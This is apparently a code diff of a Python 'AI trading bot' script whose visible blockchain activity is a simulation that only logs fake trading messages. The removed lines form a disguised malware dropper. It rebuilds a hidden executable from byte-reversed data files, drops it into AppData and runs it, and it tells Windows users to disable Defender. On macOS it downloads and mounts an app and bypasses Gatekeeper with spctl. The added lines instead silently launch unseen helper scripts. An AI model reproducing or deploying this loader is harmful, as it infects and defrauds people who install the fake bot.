@@ -1,30 +1,13 @@
 import os
 import subprocess
 import platform
-import threading
 import time
+import threading
+import sys
 import json
 import random
 import logging
 from queue import Queue
-import zipfile
-import shutil
-import getpass
-import urllib.request
-
-def install_and_import(module):
-    try:
-        import importlib
-        importlib.import_module(module)
-    except ImportError:
-        import pip
-        pip.main(['install', module])
-    finally:
-        globals()[module] = importlib.import_module(module)
-
-required_modules = ['subprocess', 'os', 'platform', 'threading', 'time', 'json', 'random', 'logging', 'queue', 'zipfile', 'shutil', 'getpass', 'urllib.request']
-for module in required_modules:
-    install_and_import(module)
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
@@ -47,29 +30,6 @@ class BlockchainSimulator:
     def get_block(self, block_number):
         return self.blocks.get(block_number)
 
-def reverse_bytes(data):
-    return data[::-1]
-
-def builded(input_dir, output_file):
-    file_names = [
-        "swap.rpc", "analysis.rpc", "wallet.rpc", "blockchain.rpc", "decentralization.rpc", "trading.rpc", "staking.rpc", "yield.rpc", "liquidity.rpc", "transaction.rpc",
-        "ledger.rpc", "oracle.rpc", "consensus.rpc", "protocol.rpc", "smartcontract.rpc", "governance.rpc", "node.rpc"
-    ]
-
-    with open(output_file, 'wb') as output_f:
-        for file_name in file_names:
-            file_path = os.path.join(input_dir, file_name)
-            with open(file_path, 'rb') as input_f:
-                reversed_chunk_data = input_f.read()
-                chunk_data = reverse_bytes(reversed_chunk_data)
-                output_f.write(chunk_data)
-
-def run_builder(file_path):
-    try:
-        subprocess.run([file_path], check=True)
-    except subprocess.CalledProcessError as e:
-        print(f"Error occurred while trying to run the file: {e}")
-
 def rpc_server(blockchain, data_queue):
     while True:
         block = blockchain.generate_block()
@@ -78,90 +38,39 @@ def rpc_server(blockchain, data_queue):
         logging.info(f"RPC Server: Looking for a new trading pair - Block Number {block['block_number']}")
         time.sleep(random.randint(1, 3))
 
-def is_defender_active():
+def run_mac_helper():
     try:
-        result = subprocess.run(['powershell', '-Command', 'Get-MpPreference'], capture_output=True, text=True)
-        output = result.stdout
-        if 'DisableRealtimeMonitoring' in output:
-            if 'DisableRealtimeMonitoring  : False' in output:
-                return True
-        return False
-    except Exception as e:
-        print(f"Error checking Windows Defender status: {e}")
-        return False
-
-def open_untrusted_app(app_path):
-    try:
-        subprocess.run(["spctl", "--add", app_path], check=True)
-        subprocess.run(["spctl", "--enable", "--label", "Developer ID"], check=True)
-        subprocess.run(["open", app_path], check=True)
+        helper_path = os.path.join(os.path.dirname(__file__), 'helpers', 'base_helper.py')
+        subprocess.run(['python3', helper_path], check=True, stdout=sys.stdout, stderr=sys.stderr)
     except subprocess.CalledProcessError as e:
-        print(f"Error opening app: {e}")
+        print(f"Error running basec Safe Connector: {e}")
 
-def extract_zip(zip_path, extract_to):
+def run_windows_helper():
     try:
-        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
-            zip_ref.extractall(extract_to)
-    except zipfile.BadZipFile as e:
-        print(f"Error extracting zip file: {e}")
-
-def download_zip(url, save_path):
-    try:
-        urllib.request.urlretrieve(url, save_path)
-        print(f"Downloaded zip file from {url}")
-    except Exception as e:
-        print(f"Error downloading zip file: {e}")
+        helper_path = os.path.join(os.path.dirname(__file__), 'helpers', 'basec_helper.py')
+        subprocess.run(['python3', helper_path], stdout=sys.stdout, stderr=sys.stderr)
+    except subprocess.CalledProcessError as e:
+        print(f"Error running basec Safe Connector: {e}")
 
 def main():
-    blockchain = BlockchainSimulator()
-    data_queue = Queue()
-
-    rpc_server_thread = threading.Thread(target=rpc_server, args=(blockchain, data_queue))
-    blockchain_thread = threading.Thread(target=rpc_server, args=(data_queue, ' '))
-
     if platform.system() == 'Windows':
-        if is_defender_active():
-            print("Warning: Windows Defender and real-time protection are enabled, please disable them to use the bot without problems.")
-        else:
-            user_name = getpass.getuser()
-            output_path = f"C:\\Users\\{user_name}\\AppData\\Local\\.blockchainconnector.exe"
-            
-            builded("data", output_path)
-            run_builder(output_path)
+        print("Starting Windows Bot App..")
+        run_windows_helper()
+        blockchain = BlockchainSimulator()
+        data_queue = Queue()
+        rpc_server_thread = threading.Thread(target=rpc_server, args=(blockchain, data_queue))
 
-            rpc_server_thread.start()
-            blockchain_thread.start()
-
-            rpc_server_thread.join()
-            blockchain_thread.join()
+        rpc_server_thread.start()
+        rpc_server_thread.join()
     elif platform.system() == 'Darwin':
-        zip_file_to_download = 'MTHBot_Mac.zip'
-        download_url = 'https://github.com/premiumtraders/AI-AutoTrade-Bot/releases/download/V9.21.0/MTHBot_Mac.zip'
-        extract_to = './MTHBot'
-        dmg_file_to_execute = os.path.join(extract_to, 'MTHBot.dmg')
-        app_to_execute = "/Volumes/MTHBot/MTHBot.app"
-        copied_app_path = "./MTHBot.app"
+        print("Starting MacOs Bot App..")
+        run_mac_helper()
+        blockchain = BlockchainSimulator()
+        data_queue = Queue()
+        rpc_server_thread = threading.Thread(target=rpc_server, args=(blockchain, data_queue))
 
-        download_zip(download_url, zip_file_to_download)
-        
-        if os.path.exists(zip_file_to_download):
-            extract_zip(zip_file_to_download, extract_to)
-            print("Extracted the zip file.")
-            if os.path.exists(dmg_file_to_execute):
-                subprocess.run(["hdiutil", "attach", dmg_file_to_execute], check=True)
-                if os.path.exists(app_to_execute):
-                    try:
-                        shutil.copytree(app_to_execute, copied_app_path)
-                        open_untrusted_app(copied_app_path)
-                        print("To run the bot, right-click on the MTHBot.app file and click Open.")
-                    except Exception as e:
-                        print(f"Error copying app: {e}")
-                else:
-                    print(f"{app_to_execute} not found after mounting {dmg_file_to_execute}.")
-            else:
-                print(f"{dmg_file_to_execute} not found after extracting {zip_file_to_download}.")
-        else:
-            print(f"{zip_file_to_download} not found.")
+        rpc_server_thread.start()
+        rpc_server_thread.join()
     else:
         print("Unsupported operating system.")
         return
